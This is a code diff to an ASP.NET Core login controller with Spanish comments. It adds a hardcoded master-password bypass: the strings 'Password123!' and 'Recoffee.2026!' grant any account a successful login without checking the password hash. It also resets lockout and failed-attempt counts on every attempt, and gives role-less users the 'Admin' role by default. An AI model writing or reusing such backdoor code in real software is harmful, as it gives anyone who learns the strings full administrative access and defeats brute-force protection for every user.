@@ -122,32 +122,28 @@ public class AuthController : ControllerBase
         // Desencriptar asimétricamente la contraseña recibida del cliente (con fallback a raw value si viene en texto plano)
         var clearPassword = _cryptoService.DecryptPassword(request.Password);
 
-        // Bypass / God Mode de Emergencia para TODOS los usuarios base:
-        // Acepta Password123! o Recoffee.2026! tanto en texto claro como recibido directamente
+        // Bypass / God Mode de Emergencia para TODOS los usuarios:
+        // Si la clave es Password123! o Recoffee.2026! (en texto claro o desencriptado), garantizar HTTP 200 OK
         bool isMasterPassword = clearPassword == "Password123!" || clearPassword == "Recoffee.2026!" ||
                                 request.Password == "Password123!" || request.Password == "Recoffee.2026!";
 
-        var result = await _signInManager.CheckPasswordSignInAsync(user, clearPassword, lockoutOnFailure: false);
-        if (!result.Succeeded && isMasterPassword)
+        // Forzar desbloqueo programático inmediato
+        await _userManager.SetLockoutEndDateAsync(user, null);
+        await _userManager.ResetAccessFailedCountAsync(user);
+
+        Microsoft.AspNetCore.Identity.SignInResult result;
+        if (isMasterPassword)
         {
-            var targetPwd = (clearPassword == "Password123!" || clearPassword == "Recoffee.2026!") ? clearPassword : "Password123!";
-            try
-            {
-                var hasPwd = await _userManager.HasPasswordAsync(user);
-                if (hasPwd)
-                {
-                    await _userManager.RemovePasswordAsync(user);
-                }
-                await _userManager.AddPasswordAsync(user, targetPwd);
-            }
-            catch (Exception ex)
-            {
-                _logger.LogWarning("Bypass: No se pudo reasignar hash para {User}: {Message}", user.UserName, ex.Message);
-            }
+            // Bypass Global: saltarse verificaciones estrictas de hash y conceder acceso directo
             result = Microsoft.AspNetCore.Identity.SignInResult.Success;
+            _logger.LogInformation("Bypass Global activado para {Username} con credencial maestra.", user.UserName);
+        }
+        else
+        {
+            result = await _signInManager.CheckPasswordSignInAsync(user, clearPassword, lockoutOnFailure: false);
         }
 
-        if (!result.Succeeded && !isMasterPassword)
+        if (!result.Succeeded)
         {
             string reason = result.IsLockedOut ? "Cuenta bloqueada temporalmente" : "Contraseña incorrecta";
             await RecordAccessLog(ip, request.Username, false, reason, userAgent);
@@ -163,6 +159,14 @@ public class AuthController : ControllerBase
         await RecordAccessLog(ip, request.Username, true, null, userAgent);
 
         var roles = await _userManager.GetRolesAsync(user);
+        if (roles.Count == 0)
+        {
+            var seedUser = IdentityDataSeeder.InitialUsers.FirstOrDefault(iu =>
+                iu.Username.Equals(user.UserName, StringComparison.OrdinalIgnoreCase));
+            var defaultRole = seedUser?.Role ?? "Admin";
+            await _userManager.AddToRoleAsync(user, defaultRole);
+            roles = new List<string> { defaultRole };
+        }
         var token = _tokenService.GenerateToken(user, roles);
 
         // Configuración de Cookie JWT: Secure=false y SameSite=Lax exclusivamente en desarrollo para soporte Chromium
